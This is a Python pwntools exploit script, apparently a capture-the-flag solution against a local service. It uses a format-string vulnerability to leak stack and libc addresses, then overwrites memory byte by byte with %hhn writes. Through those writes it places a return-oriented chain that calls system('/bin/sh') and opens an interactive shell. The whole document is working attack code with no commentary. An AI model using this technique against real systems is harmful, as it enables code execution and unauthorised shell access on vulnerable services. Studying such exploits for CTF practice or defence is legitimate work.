#!/usr/bin/env python3
from pwn import *

s = remote('localhost', 30003)

libc = ELF('./libc.so.6')

s.recvuntil('\n\n')
s.sendline('%4$p,%15$p')
stack_addr, libc_addr = map(lambda x: int(x, 0x10), s.recvline(False).decode('ascii').split(','))
libc.address = libc_addr - 0x28cb2
log.info('libc base: %#x' % libc.address)
log.info('stack address: %#x' % stack_addr)

def fsb(target, value):
    payload = b''
    payload += bytes(f'%{value if value > 0 else 0x100}x%10$hhn', 'ascii').ljust(0x10, b' ')
    payload += p64(target)
    s.sendline(payload)

fsb(stack_addr - 1, 0xff)

pop_rdi = libc.address + 0x2858f
ret = libc.address + 0x28590

payload = b''
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\0')))
payload += p64(ret)
payload += p64(libc.symbols['system'])
for i, b in enumerate(payload):
    fsb(stack_addr + 0x38 + i, b)

fsb(stack_addr - 1, 0)

s.interactive()
